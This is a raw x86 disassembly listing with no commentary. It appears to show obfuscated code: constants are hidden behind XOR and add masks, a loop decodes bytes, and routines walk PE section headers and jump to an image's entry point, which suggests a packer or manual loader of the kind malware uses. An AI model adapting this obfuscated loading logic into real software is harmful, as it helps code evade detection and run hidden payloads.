  42603d:	xor    eax,eax
  42603f:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  426046:	xor    cl,0xa4
  426049:	sub    cl,0x14
  42604c:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  426053:	inc    eax
  426054:	cmp    eax,0x17
  426057:	jb     0x42603f
  426059:	mov    eax,DWORD PTR [ebx+0x1d8]
  42605f:	lea    ecx,[ebp-0xc0]
  426065:	push   ecx
  426066:	call   DWORD PTR [eax+0x4]
  426069:	mov    ecx,DWORD PTR [ebx+0x1d8]
  42606f:	lea    edx,[ebp-0xd8]
  426075:	push   edx
  426076:	push   eax
  426077:	call   DWORD PTR [ecx+0x8]
  42607a:	mov    DWORD PTR [ebp-0x40],eax
  42607d:	lea    eax,[ebp-0x14]
  426080:	push   eax
  426081:	mov    eax,DWORD PTR [ebx+0x18c]
  426087:	push   DWORD PTR [eax]
  426089:	mov    eax,DWORD PTR [ebp-0x40]
  42608c:	call   eax
  42608e:	mov    eax,DWORD PTR [ebp-0x4]
  426091:	xor    eax,esi
  426093:	add    eax,edi
  426095:	mov    DWORD PTR [ebp-0x34],eax
  426098:	mov    ecx,DWORD PTR [ebp-0x4]
  42609b:	mov    eax,DWORD PTR [ebp-0x14]
  42609e:	xor    ecx,esi
  4260a0:	add    ecx,edi
  4260a2:	cmp    eax,ecx
  4260a4:	je     0x4260ef
  4260a6:	mov    DWORD PTR [ebp-0x3c],eax
  4260a9:	jmp    0x4260ba
  4260ab:	mov    eax,DWORD PTR [eax]
  4260ad:	mov    ecx,DWORD PTR [ebp-0x3c]
  4260b0:	mov    DWORD PTR [ebp-0x14],eax
  4260b3:	mov    eax,DWORD PTR [ebp-0x14]
  4260b6:	cmp    eax,ecx
  4260b8:	je     0x4260c7
  4260ba:	mov    edx,DWORD PTR [eax+0x18]
  4260bd:	mov    ecx,DWORD PTR [ebx+0x18c]
  4260c3:	cmp    edx,DWORD PTR [ecx]
  4260c5:	jne    0x4260ab
  4260c7:	mov    ecx,DWORD PTR [ebx+0x18c]
  4260cd:	mov    edx,DWORD PTR [eax+0x18]
  4260d0:	cmp    edx,DWORD PTR [ecx]
  4260d2:	jne    0x4260ef
  4260d4:	mov    ecx,DWORD PTR [ebx+0x190]
  4260da:	mov    edx,DWORD PTR [ebp-0x20]
  4260dd:	mov    edx,DWORD PTR [edx+0x28]
  4260e0:	add    edx,DWORD PTR [ecx]
  4260e2:	mov    DWORD PTR [eax+0x1c],edx
  4260e5:	mov    eax,DWORD PTR [ebp-0x24]
  4260e8:	xor    eax,esi
  4260ea:	add    eax,edi
  4260ec:	mov    DWORD PTR [ebp-0x34],eax
  4260ef:	mov    eax,DWORD PTR [ebp+0xc]
  4260f2:	push   ebx
  4260f3:	push   eax
  4260f4:	push   DWORD PTR [ebp+0x20]
  4260f7:	call   0x425873
  4260fc:	test   eax,eax
  4260fe:	je     0x4261c7
  426104:	push   DWORD PTR [ebp+0xc]
  426107:	mov    ecx,ebx
  426109:	push   DWORD PTR [ebp+0x20]
  42610c:	call   0x4257cc
  426111:	test   eax,eax
  426113:	je     0x4261c7
  426119:	mov    eax,DWORD PTR [ebp+0xc]
  42611c:	mov    edx,DWORD PTR [ebp+0x20]
  42611f:	mov    ecx,ebx
  426121:	call   0x4256a5
  426126:	test   eax,eax
  426128:	je     0x4261c7
  42612e:	push   ebx
  42612f:	push   DWORD PTR [ebp+0x20]
  426132:	call   0x425b56
  426137:	test   eax,eax
  426139:	je     0x4261c7
  42613f:	mov    eax,DWORD PTR [ebx+0x18c]
  426145:	mov    edx,DWORD PTR [ebp+0x20]
  426148:	cmp    edx,DWORD PTR [eax]
  42614a:	jne    0x426166
  42614c:	mov    eax,DWORD PTR [ebx+0x1d8]
  426152:	lea    ecx,[ebp-0x18]
  426155:	push   ecx
  426156:	push   DWORD PTR [ebp-0x18]
  426159:	mov    ecx,DWORD PTR [ebp-0x20]
  42615c:	push   DWORD PTR [ecx+0x54]
  42615f:	push   edx
  426160:	call   DWORD PTR [eax+0x1c]
  426163:	mov    edx,DWORD PTR [ebp+0x20]
  426166:	mov    eax,DWORD PTR [ebx+0x1c8]
  42616c:	mov    eax,DWORD PTR [eax]
  42616e:	xor    eax,esi
  426170:	add    eax,edi
  426172:	je     0x4261ab
  426174:	mov    ecx,DWORD PTR [ebp+0xc]
  426177:	mov    eax,DWORD PTR [ecx+0x28]
  42617a:	mov    DWORD PTR [ebp+0x8],0xf89ca5b0
  426181:	mov    esi,DWORD PTR [ebp+0x8]
  426184:	push   DWORD PTR [ebp+0x14]
  426187:	xor    esi,0x8a4
  42618d:	push   DWORD PTR [ebp+0x10]
  426190:	add    esi,0x72ec
  426196:	or     WORD PTR [ecx+0x16],si
  42619a:	add    eax,edx
  42619c:	push   edx
  42619d:	call   eax
  42619f:	mov    DWORD PTR [ebx+0x1d0],0xf89c85b1
  4261a9:	jmp    0x4261b5
  4261ab:	mov    eax,DWORD PTR [ebp+0xc]
  4261ae:	mov    eax,DWORD PTR [eax+0x28]
  4261b1:	add    eax,edx
  4261b3:	call   eax
  4261b5:	mov    DWORD PTR [ebp-0x8],eax
  4261b8:	mov    eax,DWORD PTR [ebp-0x8]
  4261bb:	mov    ecx,DWORD PTR [ebp+0x1c]
  4261be:	mov    DWORD PTR [ecx],eax
  4261c0:	mov    DWORD PTR [ebp-0x30],0x1
  4261c7:	cmp    DWORD PTR [ebp-0x30],0x0
  4261cb:	jne    0x4261d1
  4261cd:	and    DWORD PTR [ebp+0x20],0x0
  4261d1:	mov    eax,DWORD PTR [ebp+0x20]
  4261d4:	jmp    0x4261d8
  4261d6:	xor    eax,eax
  4261d8:	pop    edi
  4261d9:	pop    esi
  4261da:	pop    ebx
  4261db:	leave  
  4261dc:	ret    0x1c
  4261df:	push   ebp
  4261e0:	mov    ebp,esp
  4261e2:	movzx  edx,WORD PTR [ecx+0x6]
  4261e6:	movzx  eax,WORD PTR [ecx+0x14]
  4261ea:	push   ebx
  4261eb:	push   edi
  4261ec:	xor    edi,edi
  4261ee:	lea    eax,[eax+ecx*1+0x18]
  4261f2:	test   edx,edx
  4261f4:	je     0x426215
  4261f6:	mov    ecx,DWORD PTR [eax+0xc]
  4261f9:	lea    ebx,[ecx+esi*1]
  4261fc:	cmp    DWORD PTR [ebp+0x8],ebx
  4261ff:	jb     0x42620d
  426201:	mov    ebx,DWORD PTR [eax+0x8]
  426204:	add    ebx,ecx
  426206:	add    ebx,esi
  426208:	cmp    DWORD PTR [ebp+0x8],ebx
  42620b:	jb     0x426217
  42620d:	add    eax,0x28
  426210:	inc    edi
  426211:	cmp    edi,edx
  426213:	jb     0x4261f6
  426215:	xor    eax,eax
  426217:	pop    edi
  426218:	pop    ebx
  426219:	pop    ebp
  42621a:	ret    0x4
  42621d:	push   ebp
  42621e:	mov    ebp,esp
  426220:	sub    esp,0x34
  426223:	mov    DWORD PTR [ebp-0xc],0xf89c85b0
  42622a:	mov    DWORD PTR [ebp-0x18],0xf89c85b1
  426231:	mov    DWORD PTR [ebp-0x1c],0xf89c85b2
  426238:	mov    DWORD PTR [ebp-0x8],0xf89c85d1
  42623f:	mov    DWORD PTR [ebp-0x20],0xf89c85f1
  426246:	mov    DWORD PTR [ebp-0x2c],0xf89c852a
  42624d:	mov    DWORD PTR [ebp-0x2c],0xf89c85ca
  426254:	mov    DWORD PTR [ebp-0x10],eax
  426257:	mov    eax,DWORD PTR [ebp+0x8]
  42625a:	mov    DWORD PTR [ebp-0x14],eax
  42625d:	mov    eax,DWORD PTR [ebp-0xc]
  426260:	push   ebx
  426261:	mov    ecx,0x75108a4
  426266:	xor    eax,ecx
  426268:	push   esi
  426269:	mov    esi,DWORD PTR [ebp-0x10]
  42626c:	mov    edx,0x3272ec
  426271:	add    eax,edx
  426273:	push   edi
  426274:	cmp    esi,eax
  426276:	je     0x426455
  42627c:	mov    eax,DWORD PTR [ebp-0xc]
  42627f:	mov    esi,DWORD PTR [ebp-0x14]
  426282:	xor    eax,ecx
  426284:	add    eax,edx
  426286:	cmp    esi,eax
  426288:	je     0x426455
  42628e:	mov    eax,DWORD PTR [ebp-0xc]
  426291:	xor    eax,ecx
  426293:	add    eax,edx
  426295:	mov    DWORD PTR [ebp-0x24],eax
  426298:	mov    eax,DWORD PTR [ebp-0xc]
  42629b:	xor    eax,ecx
  42629d:	add    eax,edx
  42629f:	mov    DWORD PTR [ebp-0x28],eax
  4262a2:	mov    edi,DWORD PTR [ebp-0x20]
  4262a5:	mov    ebx,DWORD PTR [ebp-0x8]
  4262a8:	mov    esi,0x8a4
  4262ad:	xor    edi,esi
  4262af:	mov    eax,0x72ec
  4262b4:	xor    ebx,esi
  4262b6:	add    edi,eax
  4262b8:	add    ebx,eax
  4262ba:	sub    ebx,edi
  4262bc:	mov    WORD PTR [ebp-0x8],bx
  4262c0:	jmp    0x426385
  4262c5:	mov    edi,DWORD PTR [ebp-0xc]
  4262c8:	mov    bx,WORD PTR [ebp-0x4]
  4262cc:	xor    edi,esi
  4262ce:	add    edi,eax
  4262d0:	cmp    bx,di
  4262d3:	je     0x4263c7
  4262d9:	mov    edi,DWORD PTR [ebp-0xc]
  4262dc:	mov    ebx,DWORD PTR [ebp+0xc]
  4262df:	xor    edi,ecx
  4262e1:	add    edi,edx
  4262e3:	cmp    ebx,edi
  4262e5:	mov    di,WORD PTR [ebp-0x4]
  4262e9:	mov    bx,WORD PTR [ebp+0x8]
  4262ed:	je     0x426358
  4262ef:	cmp    bx,di
  4262f2:	je     0x426361
  4262f4:	mov    edi,DWORD PTR [ebp-0x20]
  4262f7:	mov    bx,WORD PTR [ebp+0x8]
  4262fb:	xor    edi,esi
  4262fd:	add    edi,eax
  4262ff:	cmp    bx,di
  426302:	jb     0x426322
  426304:	mov    edi,DWORD PTR [ebp-0x2c]
  426307:	mov    bx,WORD PTR [ebp+0x8]
  42630b:	xor    edi,esi
  42630d:	add    edi,eax
  42630f:	cmp    bx,di
  426312:	ja     0x426322
  426314:	movzx  edi,WORD PTR [ebp+0x8]
  426318:	movzx  ebx,WORD PTR [ebp-0x8]
  42631c:	add    edi,ebx
  42631e:	mov    WORD PTR [ebp+0x8],di
  426322:	mov    edi,DWORD PTR [ebp-0x20]
  426325:	mov    bx,WORD PTR [ebp-0x4]
  426329:	xor    edi,esi
  42632b:	add    edi,eax
  42632d:	cmp    bx,di
  426330:	jb     0x426350
  426332:	mov    edi,DWORD PTR [ebp-0x2c]
  426335:	mov    bx,WORD PTR [ebp-0x4]
  426339:	xor    edi,esi
  42633b:	add    edi,eax
  42633d:	cmp    bx,di
  426340:	ja     0x426350
  426342:	movzx  edi,WORD PTR [ebp-0x4]
  426346:	movzx  ebx,WORD PTR [ebp-0x8]
  42634a:	add    edi,ebx
  42634c:	mov    WORD PTR [ebp-0x4],di
  426350:	mov    di,WORD PTR [ebp-0x4]
  426354:	mov    bx,WORD PTR [ebp+0x8]
  426358:	cmp    bx,di
  42635b:	jne    0x426455
  426361:	mov    edi,DWORD PTR [ebp-0x1c]
  426364:	mov    ebx,DWORD PTR [ebp-0x10]
  426367:	xor    edi,ecx
  426369:	lea    edi,[edi+ebx*1+0x3272ec]
  426370:	mov    DWORD PTR [ebp-0x10],edi
  426373:	mov    edi,DWORD PTR [ebp-0x1c]
  426376:	mov    ebx,DWORD PTR [ebp-0x14]
  426379:	xor    edi,ecx
  42637b:	lea    edi,[edi+ebx*1+0x3272ec]
  426382:	mov    DWORD PTR [ebp-0x14],edi
  426385:	mov    edi,DWORD PTR [ebp-0x24]
  426388:	mov    ebx,DWORD PTR [ebp-0x10]
  42638b:	mov    di,WORD PTR [ebx+edi*2]
  42638f:	mov    WORD PTR [ebp+0x8],di
  426393:	mov    edi,DWORD PTR [ebp-0x28]
  426396:	mov    ebx,DWORD PTR [ebp-0x14]
  426399:	mov    di,WORD PTR [ebx+edi*2]
  42639d:	mov    WORD PTR [ebp-0x4],di
  4263a1:	mov    edi,DWORD PTR [ebp-0xc]
  4263a4:	mov    bx,WORD PTR [ebp+0x8]
  4263a8:	xor    edi,esi
  4263aa:	add    edi,eax
  4263ac:	cmp    bx,di
  4263af:	jne    0x4262c5
  4263b5:	mov    eax,DWORD PTR [ebp-0x18]
  4263b8:	mov    esi,DWORD PTR [ebp-0xc]
  4263bb:	xor    eax,ecx
  4263bd:	add    eax,edx
  4263bf:	imul   eax,esi
  4263c2:	mov    DWORD PTR [ebp-0xc],eax
  4263c5:	jmp    0x4263d9
  4263c7:	mov    eax,DWORD PTR [ebp-0xc]
  4263ca:	mov    esi,DWORD PTR [ebp-0x18]
  4263cd:	xor    eax,ecx
  4263cf:	lea    eax,[eax+esi*1+0x3272ec]
  4263d6:	mov    DWORD PTR [ebp-0x18],eax
  4263d9:	mov    eax,DWORD PTR [ebp-0x24]
  4263dc:	sub    eax,edx
  4263de:	xor    eax,ecx
  4263e0:	mov    DWORD PTR [ebp-0x30],eax
  4263e3:	mov    eax,DWORD PTR [ebp-0x28]
  4263e6:	sub    eax,edx
  4263e8:	xor    eax,ecx
  4263ea:	mov    DWORD PTR [ebp-0x34],eax
  4263ed:	mov    eax,DWORD PTR [ebp-0x34]
  4263f0:	mov    esi,DWORD PTR [ebp-0x1c]
  4263f3:	xor    esi,ecx
  4263f5:	add    esi,edx
  4263f7:	xor    eax,ecx
  4263f9:	add    eax,0x3272ec
  4263fe:	imul   esi,eax
  426401:	mov    eax,DWORD PTR [ebp-0x14]
  426404:	movzx  eax,WORD PTR [esi+eax*1]
  426408:	mov    esi,DWORD PTR [ebp-0x30]
  42640b:	mov    edi,DWORD PTR [ebp-0x1c]
  42640e:	xor    esi,ecx
  426410:	add    esi,edx
  426412:	xor    edi,ecx
  426414:	add    edi,edx
  426416:	imul   edi,esi
  426419:	mov    esi,DWORD PTR [ebp-0x10]
  42641c:	movzx  esi,WORD PTR [edi+esi*1]
  426420:	sub    eax,edx
  426422:	sub    esi,edx
  426424:	xor    eax,ecx
  426426:	xor    esi,ecx
  426428:	cmp    esi,eax
  42642a:	jne    0x426455
  42642c:	mov    eax,DWORD PTR [ebp-0x30]
  42642f:	mov    esi,DWORD PTR [ebp-0x1c]
  426432:	xor    eax,ecx
  426434:	add    eax,0x3272ec
  426439:	xor    esi,ecx
  42643b:	add    esi,edx
  42643d:	imul   esi,eax
  426440:	mov    eax,DWORD PTR [ebp-0x10]
  426443:	movzx  eax,WORD PTR [esi+eax*1]
  426447:	mov    esi,DWORD PTR [ebp-0xc]
  42644a:	sub    eax,edx
  42644c:	xor    eax,ecx
  42644e:	cmp    eax,esi
  426450:	mov    eax,DWORD PTR [ebp-0xc]
  426453:	je     0x426458
  426455:	mov    eax,DWORD PTR [ebp-0x18]
  426458:	pop    edi
  426459:	xor    eax,ecx
  42645b:	pop    esi
  42645c:	add    eax,edx
  42645e:	pop    ebx
  42645f:	leave  
  426460:	ret    0x8
  426463:	push   ebp
  426464:	mov    ebp,esp
  426466:	push   ecx
  426467:	mov    cx,WORD PTR [eax]
  42646a:	push   esi
  42646b:	mov    esi,0x3b56
  426470:	sub    cx,si
  426473:	mov    esi,0x8a94
  426478:	xor    cx,si
  42647b:	mov    esi,0x4e3e
  426480:	mov    DWORD PTR [ebp-0x4],0xf89c85b7
  426487:	mov    edx,0xf89c85b0
  42648c:	cmp    cx,si
  42648f:	je     0x4264ee
  426491:	push   ebx
  426492:	push   edi
  426493:	movzx  ecx,cx
  426496:	mov    edi,0xffcd8d14
  42649b:	mov    esi,0x75108a4
  4264a0:	mov    ebx,0x4f92
  4264a5:	cmp    cx,bx
  4264a8:	jne    0x4264ad
  4264aa:	mov    DWORD PTR [ebp-0x4],edx
  4264ad:	lea    edx,[edi+0x1]
  4264b0:	xor    edx,esi
  4264b2:	mov    edi,edx
  4264b4:	xor    edi,esi
  4264b6:	mov    cx,WORD PTR [eax+edi*2+0x64e5d8]
  4264be:	mov    ebx,0x3b56
  4264c3:	sub    cx,bx
  4264c6:	mov    ebx,0x8a94
  4264cb:	xor    cx,bx
  4264ce:	mov    ebx,0x4e3e
  4264d3:	cmp    cx,bx
  4264d6:	jne    0x4264a0
  4264d8:	mov    ecx,DWORD PTR [ebp-0x4]
  4264db:	pop    edi
  4264dc:	pop    ebx
  4264dd:	cmp    ecx,0xf89c85b7
  4264e3:	je     0x4264ee
  4264e5:	xor    ecx,esi
  4264e7:	lea    eax,[eax+ecx*2+0x64e5da]
  4264ee:	pop    esi
  4264ef:	leave  
  4264f0:	ret    
  4264f1:	push   ebp
  4264f2:	mov    ebp,esp
  4264f4:	push   ecx
  4264f5:	push   esi
  4264f6:	push   edi
  4264f7:	mov    DWORD PTR [ebp-0x4],0xf89c85b7
  4264fe:	mov    esi,0xf89c85b0
  426503:	call   0x426463
  426508:	mov    edi,eax
  42650a:	mov    al,BYTE PTR [edi]
  42650c:	add    al,0x3
  42650e:	xor    al,0x79
  426510:	cmp    al,0x7a
  426512:	je     0x426575
  426514:	mov    eax,edi
  426516:	mov    edx,0xffcd8d14
  42651b:	mov    ecx,0x75108a4
  426520:	push   ebx
  426521:	mov    ax,WORD PTR [eax]
  426524:	mov    ebx,0x3b56
  426529:	sub    ax,bx
  42652c:	mov    ebx,0x8a94
  426531:	xor    ax,bx
  426534:	mov    ebx,0x4e4c
  426539:	cmp    ax,bx
  42653c:	jne    0x426541
  42653e:	mov    DWORD PTR [ebp-0x4],esi
  426541:	lea    esi,[edx+0x1]
  426544:	xor    esi,ecx
  426546:	mov    edx,esi
  426548:	xor    edx,ecx
  42654a:	lea    eax,[edi+edx*2+0x64e5d8]
  426551:	mov    bl,BYTE PTR [eax]
  426553:	add    bl,0x3
  426556:	xor    bl,0x79
  426559:	cmp    bl,0x7a
  42655c:	jne    0x426521
  42655e:	mov    eax,DWORD PTR [ebp-0x4]
  426561:	pop    ebx
  426562:	cmp    eax,0xf89c85b7
  426567:	je     0x426575
  426569:	xor    eax,ecx
  42656b:	xor    ecx,ecx
  42656d:	mov    WORD PTR [edi+eax*2+0x64e5d8],cx
  426575:	mov    eax,edi
  426577:	pop    edi
  426578:	pop    esi
  426579:	leave  
  42657a:	ret    
  42657b:	push   ebp
  42657c:	mov    ebp,esp
  42657e:	push   ecx
  42657f:	push   esi
  426580:	mov    DWORD PTR [ebp-0x4],0xf89c85b7
  426587:	mov    esi,0xf89c85b0
  42658c:	call   0x426463
  426591:	mov    cx,WORD PTR [eax]
  426594:	mov    edx,0x3b56
  426599:	sub    cx,dx
  42659c:	mov    edx,0x8a94
  4265a1:	xor    cx,dx
  4265a4:	mov    edx,0x4e3e
  4265a9:	cmp    cx,dx
  4265ac:	je     0x426605
  4265ae:	push   ebx
  4265af:	push   edi
  4265b0:	movzx  ecx,cx
  4265b3:	mov    edx,0xffcd8d14
  4265b8:	mov    edi,0x75108a4
  4265bd:	mov    ebx,0x4e4c
  4265c2:	cmp    cx,bx
  4265c5:	jne    0x4265ca
  4265c7:	mov    DWORD PTR [ebp-0x4],esi
  4265ca:	lea    esi,[edx+0x1]
  4265cd:	xor    esi,edi
  4265cf:	mov    edx,esi
  4265d1:	xor    edx,edi
  4265d3:	mov    cx,WORD PTR [eax+edx*2+0x64e5d8]
  4265db:	mov    ebx,0x3b56
  4265e0:	sub    cx,bx
  4265e3:	mov    ebx,0x8a94
  4265e8:	xor    cx,bx
  4265eb:	mov    ebx,0x4e3e
  4265f0:	cmp    cx,bx
  4265f3:	jne    0x4265bd
  4265f5:	cmp    DWORD PTR [ebp-0x4],0xf89c85b7
  4265fc:	pop    edi
  4265fd:	pop    ebx
  4265fe:	je     0x426605
  426600:	xor    eax,eax
  426602:	inc    eax
  426603:	jmp    0x426607
  426605:	xor    eax,eax
  426607:	pop    esi
  426608:	leave  
  426609:	ret    
  42660a:	push   ebp
  42660b:	mov    ebp,esp
  42660d:	push   ecx
  42660e:	mov    eax,DWORD PTR [ebp+0x8]
  426611:	movzx  ecx,WORD PTR [eax]
  426614:	push   esi
  426615:	lea    eax,[ecx-0x3b56]
  42661b:	mov    esi,0x8a94
  426620:	push   edi
  426621:	xor    eax,esi
  426623:	mov    edi,0x4e3e
  426628:	mov    DWORD PTR [ebp-0x4],edx
  42662b:	cmp    ax,di
  42662e:	je     0x42665b
  426630:	mov    eax,DWORD PTR [ebp+0x8]
  426633:	sub    eax,edx
  426635:	mov    DWORD PTR [ebp+0x8],eax
  426638:	jmp    0x42663d
  42663a:	mov    eax,DWORD PTR [ebp+0x8]
  42663d:	mov    WORD PTR [edx],cx
  426640:	add    edx,0x2
  426643:	movzx  edi,WORD PTR [eax+edx*1]
  426647:	mov    ecx,edi
  426649:	add    edi,0xffffc4aa
  42664f:	xor    edi,esi
  426651:	mov    eax,0x4e3e
  426656:	cmp    di,ax
  426659:	jne    0x42663a
  42665b:	xor    eax,eax
  42665d:	pop    edi
  42665e:	mov    WORD PTR [edx],ax
  426661:	mov    eax,DWORD PTR [ebp-0x4]
  426664:	pop    esi
  426665:	leave  
  426666:	ret    0x4
  426669:	push   ebp
  42666a:	mov    ebp,esp
  42666c:	sub    esp,0x18
  42666f:	mov    DWORD PTR [ebp-0x8],0xf89c85b0
  426676:	mov    DWORD PTR [ebp-0x18],0xf89c85b1
  42667d:	mov    ecx,DWORD PTR [ebp-0x8]
  426680:	push   esi
  426681:	mov    eax,0x75108a4
  426686:	xor    ecx,eax
  426688:	mov    esi,0x3272ec
  42668d:	add    ecx,esi
  42668f:	mov    DWORD PTR [ebp-0x4],ecx
  426692:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  426699:	mov    DWORD PTR [ebp-0x10],0xf89c85bc
  4266a0:	push   edi
  4266a1:	mov    DWORD PTR [ebp-0x14],0xf89c85b2
  4266a8:	jmp    0x426749
  4266ad:	mov    ecx,DWORD PTR [ebp-0x4]
  4266b0:	mov    edx,DWORD PTR [ebp+0x10]
  4266b3:	sub    edx,ecx
  4266b5:	mov    ecx,DWORD PTR [ebp-0xc]
  4266b8:	xor    ecx,eax
  4266ba:	add    ecx,esi
  4266bc:	cmp    edx,ecx
  4266be:	jbe    0x4266db
  4266c0:	mov    edx,DWORD PTR [ebp-0x4]
  4266c3:	add    edx,DWORD PTR [ebp+0x8]
  4266c6:	mov    ecx,DWORD PTR [ebp-0x4]
  4266c9:	add    ecx,DWORD PTR [ebp+0xc]
  4266cc:	mov    edi,DWORD PTR [ecx]
  4266ce:	mov    DWORD PTR [edx],edi
  4266d0:	mov    ecx,DWORD PTR [ecx+0x4]
  4266d3:	mov    DWORD PTR [edx+0x4],ecx
  4266d6:	mov    ecx,DWORD PTR [ebp-0xc]
  4266d9:	jmp    0x426728
  4266db:	mov    ecx,DWORD PTR [ebp-0x4]
  4266de:	mov    edx,DWORD PTR [ebp+0x10]
  4266e1:	sub    edx,ecx
  4266e3:	mov    ecx,DWORD PTR [ebp-0x10]
  4266e6:	xor    ecx,eax
  4266e8:	add    ecx,esi
  4266ea:	cmp    edx,ecx
  4266ec:	mov    ecx,DWORD PTR [ebp-0x4]
  4266ef:	jbe    0x426703
  4266f1:	add    ecx,DWORD PTR [ebp+0x8]
  4266f4:	mov    edx,DWORD PTR [ebp-0x4]
  4266f7:	add    edx,DWORD PTR [ebp+0xc]
  4266fa:	mov    edx,DWORD PTR [edx]
  4266fc:	mov    DWORD PTR [ecx],edx
  4266fe:	mov    ecx,DWORD PTR [ebp-0x10]
  426701:	jmp    0x426728
  426703:	mov    edx,DWORD PTR [ebp+0x10]
  426706:	sub    edx,ecx
  426708:	mov    ecx,DWORD PTR [ebp-0x14]
  42670b:	xor    ecx,eax
  42670d:	add    ecx,esi
  42670f:	cmp    edx,ecx
  426711:	mov    ecx,DWORD PTR [ebp-0x4]
  426714:	jbe    0x426739
  426716:	add    ecx,DWORD PTR [ebp+0x8]
  426719:	mov    edx,DWORD PTR [ebp-0x4]
  42671c:	add    edx,DWORD PTR [ebp+0xc]
  42671f:	mov    dx,WORD PTR [edx]
  426722:	mov    WORD PTR [ecx],dx
  426725:	mov    ecx,DWORD PTR [ebp-0x14]
  426728:	mov    edx,DWORD PTR [ebp-0x4]
  42672b:	xor    ecx,eax
  42672d:	lea    ecx,[ecx+edx*1+0x3272ec]
  426734:	mov    DWORD PTR [ebp-0x4],ecx
  426737:	jmp    0x426749
  426739:	add    ecx,DWORD PTR [ebp+0x8]
  42673c:	mov    edx,DWORD PTR [ebp-0x4]
  42673f:	add    edx,DWORD PTR [ebp+0xc]
  426742:	mov    dl,BYTE PTR [edx]
  426744:	mov    BYTE PTR [ecx],dl
  426746:	inc    DWORD PTR [ebp-0x4]
  426749:	mov    ecx,DWORD PTR [ebp-0x18]
  42674c:	mov    edx,DWORD PTR [ebp+0x10]
  42674f:	xor    ecx,eax
  426751:	add    ecx,esi
  426753:	imul   ecx,edx
  426756:	mov    edx,DWORD PTR [ebp-0x8]
  426759:	mov    edi,DWORD PTR [ebp-0x4]
  42675c:	xor    edx,eax
  42675e:	lea    edx,[edx+edi*1+0x3272ec]
  426765:	cmp    edx,ecx
  426767:	jb     0x4266ad
  42676d:	pop    edi
  42676e:	pop    esi
  42676f:	leave  
  426770:	ret    0xc
  426773:	push   ebp
  426774:	mov    ebp,esp
  426776:	sub    esp,0xc
  426779:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  426780:	push   esi
  426781:	mov    esi,eax
  426783:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  42678a:	mov    edx,DWORD PTR [ebp-0x4]
  42678d:	mov    eax,0x75108a4
  426792:	xor    edx,eax
  426794:	mov    ecx,0x3272ec
  426799:	add    edx,ecx
  42679b:	cmp    esi,edx
  42679d:	je     0x4267df
  42679f:	push   ebx
  4267a0:	push   edi
  4267a1:	mov    edx,DWORD PTR [ebp-0x8]
  4267a4:	mov    ebx,DWORD PTR [ebp+0x8]
  4267a7:	xor    edx,eax
  4267a9:	mov    edi,0xffcd8d14
  4267ae:	sub    edi,edx
  4267b0:	add    esi,edi
  4267b2:	lea    edx,[esi-0x3272ec]
  4267b8:	xor    edx,eax
  4267ba:	mov    DWORD PTR [ebp-0xc],edx
  4267bd:	mov    edx,DWORD PTR [ebp-0x4]
  4267c0:	mov    edi,DWORD PTR [ebp-0xc]
  4267c3:	xor    dl,0xa4
  4267c6:	sub    dl,0x14
  4267c9:	xor    edi,eax
  4267cb:	mov    BYTE PTR [edi+ebx*1+0x3272ec],dl
  4267d2:	mov    edx,DWORD PTR [ebp-0x4]
  4267d5:	xor    edx,eax
  4267d7:	add    edx,ecx
  4267d9:	cmp    esi,edx
  4267db:	jne    0x4267a1
  4267dd:	pop    edi
  4267de:	pop    ebx
  4267df:	pop    esi
  4267e0:	leave  
  4267e1:	ret    0x4
  4267e4:	push   ebp
  4267e5:	mov    ebp,esp
  4267e7:	sub    esp,0x21c
  4267ed:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  4267f4:	mov    DWORD PTR [ebp-0x14],0xf89c85b1
  4267fb:	mov    eax,DWORD PTR [ebp+0x10]
  4267fe:	mov    eax,DWORD PTR [ebp-0x4]
  426801:	mov    ecx,DWORD PTR [ebp+0x8]
  426804:	push   esi
  426805:	push   edi
  426806:	mov    edi,0x75108a4
  42680b:	xor    eax,edi
  42680d:	mov    esi,0x3272ec
  426812:	add    eax,esi
  426814:	cmp    eax,ecx
  426816:	mov    eax,DWORD PTR [ebp-0x4]
  426819:	jne    0x426824
  42681b:	xor    eax,edi
  42681d:	add    eax,esi
  42681f:	jmp    0x4268d0
  426824:	mov    ecx,DWORD PTR [ebp+0xc]
  426827:	xor    eax,edi
  426829:	add    eax,esi
  42682b:	cmp    eax,ecx
  42682d:	jne    0x426834
  42682f:	mov    eax,DWORD PTR [ebp-0x4]
  426832:	jmp    0x42681b
  426834:	lea    eax,[ebp-0x21c]
  42683a:	mov    DWORD PTR [ebp-0x8],eax
  42683d:	mov    eax,DWORD PTR [ebp+0xc]
  426840:	mov    DWORD PTR [ebp-0x10],eax
  426843:	mov    eax,DWORD PTR [ebp-0x4]
  426846:	xor    eax,edi
  426848:	add    eax,esi
  42684a:	mov    DWORD PTR [ebp+0x10],eax
  42684d:	mov    eax,DWORD PTR [ebp+0xc]
  426850:	push   ebx
  426851:	call   0x42657b
  426856:	mov    ebx,eax
  426858:	mov    eax,DWORD PTR [ebp+0x8]
  42685b:	mov    eax,DWORD PTR [eax+0x14]
  42685e:	jmp    0x4268b8
  426860:	mov    eax,DWORD PTR [ebp+0xc]
  426863:	sub    eax,0x8
  426866:	mov    DWORD PTR [ebp-0xc],eax
  426869:	mov    eax,DWORD PTR [ebp-0xc]
  42686c:	mov    eax,DWORD PTR [eax+0x28]
  42686f:	call   0x426463
  426874:	mov    DWORD PTR [ebp+0x10],eax
  426877:	push   DWORD PTR [ebp+0x10]
  42687a:	mov    edx,DWORD PTR [ebp-0x8]
  42687d:	call   0x42660a
  426882:	mov    eax,DWORD PTR [ebp-0x4]
  426885:	xor    eax,edi
  426887:	add    eax,esi
  426889:	cmp    eax,ebx
  42688b:	jne    0x426895
  42688d:	mov    eax,DWORD PTR [ebp-0x8]
  426890:	call   0x4264f1
  426895:	mov    eax,DWORD PTR [ebp-0x14]
  426898:	xor    eax,edi
  42689a:	add    eax,esi
  42689c:	push   eax
  42689d:	push   DWORD PTR [ebp-0x10]
  4268a0:	mov    eax,DWORD PTR [ebp-0x8]
  4268a3:	call   0x42621d
  4268a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4268ab:	xor    ecx,edi
  4268ad:	add    ecx,esi
  4268af:	cmp    eax,ecx
  4268b1:	je     0x4268d6
  4268b3:	mov    eax,DWORD PTR [ebp+0xc]
  4268b6:	mov    eax,DWORD PTR [eax]
  4268b8:	mov    DWORD PTR [ebp+0xc],eax
